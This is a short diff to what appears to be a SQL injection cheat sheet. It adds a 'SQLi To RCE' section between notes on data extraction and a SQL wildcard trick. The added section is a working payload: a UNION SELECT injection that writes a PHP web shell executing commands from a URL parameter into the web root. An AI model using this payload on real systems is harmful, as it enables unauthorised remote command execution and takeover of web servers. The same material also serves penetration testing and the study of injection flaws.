@@ -292,7 +292,10 @@ Extract data :
 
 
 ```
-
+## SQLi To RCE
+```sql
+' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php' #
+```
 ## SQL Wildcard Trick 
 - This is the intresting type of feature in SQL
   Remeber using * in linux terminal
